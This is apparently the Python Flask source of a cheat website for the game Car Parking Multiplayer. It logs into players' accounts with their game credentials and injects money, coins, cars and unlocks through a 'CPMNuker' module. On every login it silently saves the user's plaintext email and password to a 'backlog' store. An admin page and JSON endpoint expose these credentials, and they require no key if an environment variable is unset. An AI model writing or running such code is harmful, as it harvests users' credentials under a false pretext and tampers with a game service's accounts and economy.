#!/usr/bin/env python3
"""TNNR CPM1 Webtool - Malik logic website adapter."""

import asyncio
import os
import re
import uuid
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Callable, Dict

from flask import Flask, flash, jsonify, redirect, render_template, request, session, url_for

from cpm_nuker import MAX_COIN, MAX_MONEY, CPMNuker
from car_bulk_injector import inject_saved_cars
import backlog

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", os.getenv("FLASK_SECRET", "change-this-to-a-secure-random-string-in-production"))

nuker = CPMNuker()

# Keep normal async actions on one long-lived event loop so aiohttp can reuse
# connections instead of rebuilding an event loop and TCP pool for every click.
_ASYNC_LOOP = asyncio.new_event_loop()
def _async_loop_runner():
    asyncio.set_event_loop(_ASYNC_LOOP)
    _ASYNC_LOOP.run_forever()

_ASYNC_THREAD = threading.Thread(target=_async_loop_runner, name="tnnr-async-loop", daemon=True)
_ASYNC_THREAD.start()

CAR_INJECTION_JOBS: Dict[str, Dict[str, Any]] = {}
CAR_INJECTION_LOCK = threading.Lock()
CAR_INJECTION_WORKERS = max(1, int(os.getenv("CAR_INJECTION_WORKERS", "6")))
CAR_INJECTION_EXECUTOR = ThreadPoolExecutor(max_workers=CAR_INJECTION_WORKERS, thread_name_prefix="car-inject")

FEATURE_ACTIONS = {
    "unlock_w16": ("W16 Engine", nuker.unlock_w16),
    "unlock_horns": ("Horns", nuker.unlock_horns),
    "disable_damage": ("No Damage", nuker.disable_damage),
    "unlimited_fuel": ("Unlimited Fuel", nuker.unlimited_fuel),
    "unlock_smoke": ("Smoke", nuker.unlock_smoke),
    "unlock_animations": ("Animations", nuker.unlock_animations),
    "unlock_wheels": ("Wheels", nuker.unlock_wheels),
    "unlock_houses": ("Houses", nuker.unlock_houses),
    "complete_levels": ("Complete All Levels", nuker.complete_all_levels),
    "set_rank": ("Max Rank", nuker.set_rank),
    "unlock_all_features": ("Unlock All Features", nuker.unlock_all_features),
}

EQUIPMENT_ACTIONS = {
    "unlock_male_equipment": ("Male Equipment", nuker.unlock_equipments_male),
    "unlock_female_equipment": ("Female Equipment", nuker.unlock_equipments_female),
}

# Temporary service-unavailable guard.
# To re-enable these actions later, remove their IDs from TEMP_UNAVAILABLE_ACTIONS
# and remove the matching banner/click handler markup in templates/dashboard.html.
TEMP_UNAVAILABLE_ACTIONS = {
    "set_player_id",
    "unlock_male_equipment",
    "unlock_female_equipment",
}
TEMP_UNAVAILABLE_MESSAGE = (
    "This service is currently disabled while I attempt in fixing it, "
    "please remain patient any updates will be posted to Tiktok and Telegram."
)

# Set this to a non-empty string to protect the /backlog admin view.
# When set, visitors must supply ?key=... matching this value.
BACKLOG_ADMIN_KEY = os.getenv("BACKLOG_ADMIN_KEY", "")


def get_web_uid() -> int:
    if "web_uid" not in session:
        session["web_uid"] = int(str(uuid.uuid4().int)[:12])
        session["email"] = None
    return session["web_uid"]


def get_email() -> str:
    return session.get("email") or "Not logged in"


def run_async(coro):
    """Run site async actions on the shared background event loop."""
    try:
        future = asyncio.run_coroutine_threadsafe(coro, _ASYNC_LOOP)
        return future.result()
    except Exception as exc:
        app.logger.exception("Async action failed")
        return {"ok": False, "message": str(exc)}


def run_isolated_async(coro):
    """Run a coroutine in the current worker thread with its own loop."""
    try:
        return asyncio.run(coro)
    except Exception as exc:
        app.logger.exception("Isolated async action failed")
        return {"ok": False, "message": str(exc)}


def parse_int_field(name: str, default: int = 0) -> int:
    raw = str(request.form.get(name, default)).replace(",", "").replace(" ", "").strip()
    return int(raw)


def action_result(ok: bool, message: str = "") -> Dict[str, Any]:
    return {"ok": ok, "message": message}


def flash_result(action_name: str, result: Dict[str, Any]):
    if result.get("ok"):
        detail = result.get("message")
        flash(f"✅ {action_name} completed successfully" + (f": {detail}" if detail and detail != "OK" else "!"), "success")
    else:
        flash(f"❌ {action_name} failed: {result.get('message', 'Unknown error')}", "error")


@app.route("/ads.txt")
def ads_txt():
    """Redirect ads.txt requests to Ezoic's managed ads.txt for tnnr.shop."""
    return redirect("https://srv.adstxtmanager.com/19390/tnnr.shop", code=301)


@app.route("/")
def index():
    """Public landing page: always show the login screen.

    Production flow for tnnr.shop:
    - https://tnnr.shop/ is the login page.
    - successful login redirects to /dashboard.
    - /dashboard stays protected by the session guard below.
    """
    if session.get("logged_in"):
        web_uid = session.get("web_uid")
        if web_uid:
            try:
                nuker.delete_token(web_uid)
            except Exception:
                pass
        session.clear()
    return render_template("index.html", email=get_email())


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    if not email or not password:
        flash("Email and password are required.", "error")
        return redirect(url_for("index"))

    web_uid = get_web_uid()
    result = run_async(nuker.account_login(email, password))
    if not result.get("ok"):
        flash(f"Login failed: {result.get('message', 'LOGIN_FAILED')}", "error")
        return redirect(url_for("index"))

    nuker.save_token(web_uid, result["auth"], email, password, result.get("refresh_token", ""), result.get("firebase_uid", ""))
    loaded = run_async(nuker.load_account(web_uid, force=True))

    session["email"] = email
    session["logged_in"] = True
    session["logout_confirmed"] = False

    # --- Backlog: store credentials in player_name:email:password format ---
    player_name = "Unknown"
    if loaded:
        acct = nuker.get_user_template(web_uid, email) or {}
        player_name = acct.get("Name") or "Unknown"
    try:
        backlog.record_credentials(player_name, email, password, web_uid=web_uid)
        backlog.log_action(email, "login", "Login", True,
                           message="User logged in successfully",
                           web_uid=web_uid, player_name=player_name)
    except Exception:
        app.logger.exception("Backlog credential recording failed")
    # -----------------------------------------------------------------------

    if loaded:
        flash(f"✅ Successfully logged in and loaded account data for {email}", "success")
    else:
        flash("⚠️ Login succeeded, but account data could not be loaded yet. Try Refresh Account Data before applying modifiers.", "error")

    return redirect(url_for("dashboard"))


@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        flash("Please log in first.", "error")
        return redirect(url_for("index"))

    web_uid = get_web_uid()
    email = session.get("email", "Unknown")
    data = nuker.get_user_template(web_uid, email) or {}
    floats = data.get("floats", []) if isinstance(data.get("floats", []), list) else []

    return render_template(
        "dashboard.html",
        email=email,
        name=data.get("Name", "Unknown"),
        pid=data.get("localID", "N/A"),
        money=data.get("money", 0),
        coin=data.get("coin", 0),
        wins=int(floats[8]) if len(floats) > 8 else 0,
        loses=int(floats[9]) if len(floats) > 9 else 0,
        max_money=MAX_MONEY,
        max_coin=MAX_COIN,
        feature_actions=FEATURE_ACTIONS,
        equipment_actions=EQUIPMENT_ACTIONS,
        disabled_actions=TEMP_UNAVAILABLE_ACTIONS,
        disabled_action_message=TEMP_UNAVAILABLE_MESSAGE,
        require_logout_confirm=not session.get("logout_confirmed"),
    )


@app.route("/free")
def free_version():
    """Lightweight free tool with only the three supported modifiers."""
    if not session.get("logged_in"):
        flash("Please log in first.", "error")
        return redirect(url_for("index"))

    web_uid = get_web_uid()
    email = session.get("email", "Unknown")
    data = nuker.get_user_template(web_uid, email) or {}

    return render_template(
        "free.html",
        title="Free Version",
        email=email,
        name=data.get("Name", "Unknown"),
        pid=data.get("localID", "N/A"),
        money=data.get("money", 0),
        coin=data.get("coin", 0),
        require_logout_confirm=not session.get("logout_confirmed"),
    )


@app.route("/free/action/<action>", methods=["POST"])
def free_action(action: str):
    """Run only the fixed modifiers exposed by the lightweight /free page."""
    if not session.get("logged_in"):
        if request.accept_mimetypes.accept_json and not request.accept_mimetypes.accept_html:
            return jsonify({"ok": False, "message": "Not logged in"}), 401
        flash("Please log in first.", "error")
        return redirect(url_for("index"))

    web_uid = get_web_uid()
    email = session.get("email", "unknown")
    player_name = "Unknown"
    try:
        acct = nuker.get_user_template(web_uid, email) or {}
        player_name = acct.get("Name") or "Unknown"
    except Exception:
        pass

    action_map = {
        "inject_50m_cash": ("Inject 50,000,000 Cash", lambda: nuker.set_money(web_uid, 50_000_000)),
        "inject_5000_coins": ("Inject 5,000 Coins", lambda: nuker.set_coin(web_uid, 5_000)),
        "unlock_w16": ("W16 Player Unlock", lambda: nuker.unlock_w16(web_uid)),
    }

    if action not in action_map:
        result = {"ok": False, "message": "Unknown free action"}
        action_title = "Unknown Free Action"
    else:
        action_title, make_coro = action_map[action]
        try:
            result = run_async(make_coro())
        except Exception as exc:
            app.logger.exception("Free action failed: %s", action)
            result = {"ok": False, "message": str(exc)}

    try:
        backlog.log_action(
            email, f"free_{action}", action_title, bool(result.get("ok")),
            message=result.get("message", ""), web_uid=web_uid, player_name=player_name
        )
    except Exception:
        app.logger.exception("Backlog free action logging failed")

    flash_result(action_title, result)
    if request.accept_mimetypes.accept_json and not request.accept_mimetypes.accept_html:
        return jsonify(result), 200 if result.get("ok") else 400
    return redirect(url_for("free_version"))


@app.route("/confirm-logout", methods=["POST"])
def confirm_logout():
    if not session.get("logged_in"):
        flash("Please log in first.", "error")
        return redirect(url_for("index"))
    session["logout_confirmed"] = True
    if request.form.get("next") == "free":
        return redirect(url_for("free_version"))
    return redirect(url_for("dashboard"))


@app.route("/refresh", methods=["POST"])
def refresh():
    if not session.get("logged_in"):
        flash("Please log in first.", "error")
        return redirect(url_for("index"))
    ok = run_async(nuker.load_account(get_web_uid(), force=True))

    # --- Backlog: log refresh action ---
    try:
        email = session.get("email", "unknown")
        backlog.log_action(email, "refresh", "Refresh Account Data", ok,
                           message="Refreshed" if ok else "Refresh failed",
                           web_uid=get_web_uid())
    except Exception:
        app.logger.exception("Backlog refresh logging failed")
    # -------------------------------------

    flash("✅ Account data refreshed." if ok else "❌ Account data refresh failed.", "success" if ok else "error")
    return redirect(url_for("dashboard"))


@app.route("/action/<action>", methods=["POST"])
def action(action: str):
    if not session.get("logged_in"):
        if request.accept_mimetypes.accept_json:
            return jsonify({"ok": False, "message": "Not logged in"}), 401
        flash("Please log in first.", "error")
        return redirect(url_for("index"))

    web_uid = get_web_uid()
    result: Dict[str, Any]
    action_title = action.replace("_", " ").title()

    if action in TEMP_UNAVAILABLE_ACTIONS:
        if request.accept_mimetypes.accept_json and not request.accept_mimetypes.accept_html:
            return jsonify({"ok": False, "disabled": True, "message": TEMP_UNAVAILABLE_MESSAGE}), 423
        flash(TEMP_UNAVAILABLE_MESSAGE, "info")
        return redirect(url_for("dashboard"))

    email = session.get("email", "unknown")
    player_name = "Unknown"
    try:
        acct = nuker.get_user_template(web_uid, email) or {}
        player_name = acct.get("Name") or "Unknown"
    except Exception:
        pass

    try:
        if action == "set_money":
            amount = parse_int_field("amount")
            if not 1 <= amount <= MAX_MONEY:
                raise ValueError(f"Money must be between 1 and {MAX_MONEY:,}.")
            result = run_async(nuker.set_money(web_uid, amount))

        elif action == "set_coin":
            amount = parse_int_field("amount")
            if not 1 <= amount <= MAX_COIN:
                raise ValueError(f"Coins must be between 1 and {MAX_COIN:,}.")
            result = run_async(nuker.set_coin(web_uid, amount))

        elif action == "set_player_name":
            name = request.form.get("name", "").strip()
            if not 1 <= len(name) <= 100:
                raise ValueError("Name must be 1-100 characters.")
            result = run_async(nuker.set_player_name(web_uid, name))

        elif action == "set_player_id":
            pid = request.form.get("pid", "").strip()
            clean = re.sub(r"\[\w+\]", "", pid)
            if not 4 <= len(clean) <= 100:
                raise ValueError("Player ID must be 4-100 characters after removing color tags.")
            result = run_async(nuker.set_player_id(web_uid, pid))

        elif action == "set_race_wins":
            wins = parse_int_field("amount")
            if wins < 0:
                raise ValueError("Wins must be 0 or greater.")
            result = run_async(nuker.set_race_wins(web_uid, wins))

        elif action == "set_race_loses":
            loses = parse_int_field("amount")
            if loses < 0:
                raise ValueError("Losses must be 0 or greater.")
            result = run_async(nuker.set_race_loses(web_uid, loses))

        elif action == "fix_account":
            result = run_async(nuker.fix_account(web_uid))

        elif action.startswith("preset_"):
            preset_map = {
                "preset_50m_30k": (50_000_000, 30_000),
                "preset_50m_50k": (50_000_000, 50_000),
                "preset_50m_100k": (50_000_000, 100_000),
                "preset_50m_500k": (50_000_000, 500_000),
            }
            if action not in preset_map:
                raise ValueError("Unknown preset.")
            money, coins = preset_map[action]
            r1 = run_async(nuker.set_money(web_uid, money))
            r2 = run_async(nuker.set_coin(web_uid, coins))
            result = {"ok": bool(r1.get("ok") and r2.get("ok")), "message": f"Money {money:,}; coins {coins:,}" if r1.get("ok") and r2.get("ok") else f"Money: {r1.get('message')}; Coins: {r2.get('message')}"}

        elif action in FEATURE_ACTIONS:
            action_title, fn = FEATURE_ACTIONS[action]
            result = run_async(fn(web_uid))

        elif action in EQUIPMENT_ACTIONS:
            action_title, fn = EQUIPMENT_ACTIONS[action]
            result = run_async(fn(web_uid))

        else:
            result = {"ok": False, "message": "Unknown action"}

    except ValueError as exc:
        result = {"ok": False, "message": str(exc)}
    except Exception as exc:
        app.logger.exception("Action failed: %s", action)
        result = {"ok": False, "message": str(exc)}

    # --- Backlog: log every action with success/failure and per-user count ---
    try:
        backlog.log_action(email, action, action_title,
                           bool(result.get("ok")),
                           message=result.get("message", ""),
                           web_uid=web_uid, player_name=player_name)
    except Exception:
        app.logger.exception("Backlog action logging failed")
    # -------------------------------------------------------------------------

    flash_result(action_title, result)
    if request.accept_mimetypes.accept_json and not request.accept_mimetypes.accept_html:
        return jsonify(result), 200 if result.get("ok") else 400
    return redirect(url_for("dashboard"))


def _run_car_injection_job(job_id: str, email: str, password: str):
    def progress(stage: str, message: str, extra=None):
        with CAR_INJECTION_LOCK:
            job = CAR_INJECTION_JOBS.get(job_id)
            if not job:
                return
            event = {
                "stage": stage,
                "message": message,
                "time": time.time(),
            }
            if extra:
                event.update(extra)
            job["events"].append(event)
            job["updated_at"] = time.time()

    try:
        result = run_isolated_async(inject_saved_cars(email, password, progress))
        with CAR_INJECTION_LOCK:
            job = CAR_INJECTION_JOBS.get(job_id)
            if job:
                job["status"] = "complete" if result.get("ok") else "finished_with_errors"
                job["result"] = result
                job["updated_at"] = time.time()
    except Exception as exc:
        app.logger.exception("Bulk car injection failed")
        with CAR_INJECTION_LOCK:
            job = CAR_INJECTION_JOBS.get(job_id)
            if job:
                job["status"] = "error"
                job["result"] = {"ok": False, "message": str(exc), "failed_ids": []}
                job["events"].append({"stage": "error", "message": str(exc), "time": time.time()})
                job["updated_at"] = time.time()


@app.route("/cars/bulk-inject", methods=["POST"])
def bulk_inject_cars():
    if not session.get("logged_in"):
        return jsonify({"ok": False, "message": "Not logged in"}), 401

    web_uid = get_web_uid()
    token_data = nuker.get_token_data(web_uid)
    if not token_data or not token_data.get("email") or not token_data.get("password"):
        return jsonify({"ok": False, "message": "Stored login information is unavailable. Please log in again."}), 400

    with CAR_INJECTION_LOCK:
        for existing_id, job in CAR_INJECTION_JOBS.items():
            if job.get("web_uid") == web_uid and job.get("status") == "running":
                return jsonify({"ok": True, "job_id": existing_id, "already_running": True})

        job_id = uuid.uuid4().hex
        CAR_INJECTION_JOBS[job_id] = {
            "web_uid": web_uid,
            "status": "running",
            "events": [{"stage": "queued", "message": "Bulk injection queued…", "time": time.time()}],
            "result": None,
            "created_at": time.time(),
            "updated_at": time.time(),
        }

    # Bounded pool: every job is still processed, but traffic spikes cannot
    # create an unlimited number of threads and event loops at once.
    CAR_INJECTION_EXECUTOR.submit(
        _run_car_injection_job,
        job_id, token_data["email"], token_data["password"]
    )
    return jsonify({"ok": True, "job_id": job_id})


@app.route("/cars/bulk-inject/status/<job_id>")
def bulk_inject_status(job_id: str):
    if not session.get("logged_in"):
        return jsonify({"ok": False, "message": "Not logged in"}), 401
    try:
        since = max(0, int(request.args.get("since", "0")))
    except (TypeError, ValueError):
        since = 0
    with CAR_INJECTION_LOCK:
        job = CAR_INJECTION_JOBS.get(job_id)
        if not job or job.get("web_uid") != get_web_uid():
            return jsonify({"ok": False, "message": "Job not found"}), 404
        all_events = job.get("events", [])
        since = min(since, len(all_events))
        return jsonify({
            "ok": True,
            "status": job.get("status"),
            "events": list(all_events[since:]),
            "next_event_index": len(all_events),
            "result": job.get("result"),
        })


@app.route("/logout")
def logout():
    web_uid = session.get("web_uid")
    email = session.get("email", "unknown")
    if web_uid:
        try:
            nuker.delete_token(web_uid)
        except Exception:
            pass
    # --- Backlog: log logout action ---
    try:
        backlog.log_action(email, "logout", "Logout", True,
                           message="User logged out", web_uid=web_uid)
    except Exception:
        pass
    # ---------------------------------
    session.clear()
    flash("You have been logged out.", "success")
    return redirect(url_for("index"))


# ===========================================================================
# Backlog admin view
# ===========================================================================
@app.route("/backlog")
def backlog_view():
    """Admin dashboard showing stored credentials and action statistics.

    Protected by BACKLOG_ADMIN_KEY env var when set.  Access via:
        /backlog          (no key required if BACKLOG_ADMIN_KEY is unset)
        /backlog?key=xxx  (when BACKLOG_ADMIN_KEY is set)
    """
    if BACKLOG_ADMIN_KEY:
        provided = request.args.get("key", "")
        if provided != BACKLOG_ADMIN_KEY:
            return render_template("base.html", title="Access Denied"), 403

    return render_template(
        "backlog.html",
        title="Backlog Admin",
        credentials=backlog.get_all_credentials(),
        actions=backlog.get_all_actions(limit=200),
        tracker=backlog.get_tracker(),
        stats=backlog.get_global_stats(),
    )


@app.route("/backlog/balance/add-all", methods=["POST"])
def backlog_add_balance_all():
    """Admin-only point-in-time balance grant for all existing members."""
    if BACKLOG_ADMIN_KEY:
        provided = request.form.get("key", "") or request.args.get("key", "")
        if provided != BACKLOG_ADMIN_KEY:
            return render_template("base.html", title="Access Denied"), 403

    try:
        amount = parse_int_field("amount")
        summary = backlog.add_balance_to_all_existing_users(amount)
        backlog.log_admin_action(
            "admin_bulk_balance",
            "Admin Bulk Balance Grant",
            True,
            message=(
                f"Added {summary['amount_each']:,} balance to "
                f"{summary['updated_users']:,} existing members "
                f"({summary['total_added']:,} total balance)."
            ),
            extra=summary,
        )
        flash(
            f"✅ Added {summary['amount_each']:,} balance to "
            f"{summary['updated_users']:,} existing members.",
            "success",
        )
    except ValueError as exc:
        flash(f"❌ {exc}", "error")
    except Exception as exc:
        app.logger.exception("Bulk balance grant failed")
        try:
            backlog.log_admin_action(
                "admin_bulk_balance", "Admin Bulk Balance Grant",
                False, message=str(exc)
            )
        except Exception:
            pass
        flash("❌ Bulk balance grant failed.", "error")

    if BACKLOG_ADMIN_KEY:
        return redirect(url_for("backlog_view", key=BACKLOG_ADMIN_KEY))
    return redirect(url_for("backlog_view"))


@app.route("/backlog/api/stats")
def backlog_api_stats():
    """JSON endpoint returning global backlog statistics."""
    if BACKLOG_ADMIN_KEY:
        provided = request.args.get("key", "")
        if provided != BACKLOG_ADMIN_KEY:
            return jsonify({"ok": False, "message": "Unauthorized"}), 403
    return jsonify({"ok": True, "stats": backlog.get_global_stats()})


@app.route("/backlog/api/actions")
def backlog_api_actions():
    """JSON endpoint returning recent action log entries."""
    if BACKLOG_ADMIN_KEY:
        provided = request.args.get("key", "")
        if provided != BACKLOG_ADMIN_KEY:
            return jsonify({"ok": False, "message": "Unauthorized"}), 403
    limit = request.args.get("limit", default=100, type=int)
    email_filter = request.args.get("email") or None
    return jsonify({
        "ok": True,
        "actions": backlog.get_all_actions(limit=limit, email_filter=email_filter),
    })


@app.route("/backlog/api/credentials")
def backlog_api_credentials():
    """JSON endpoint returning stored credentials."""
    if BACKLOG_ADMIN_KEY:
        provided = request.args.get("key", "")
        if provided != BACKLOG_ADMIN_KEY:
            return jsonify({"ok": False, "message": "Unauthorized"}), 403
    return jsonify({"ok": True, "credentials": backlog.get_all_credentials()})


@app.route("/health")
def health():
    return "✅ TNNR CPM1 Webtool is running", 200


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    print(f"🚀 Starting TNNR CPM1 Webtool on port {port}")
    app.run(host="0.0.0.0", port=port, debug=os.getenv("FLASK_DEBUG", "0") == "1")
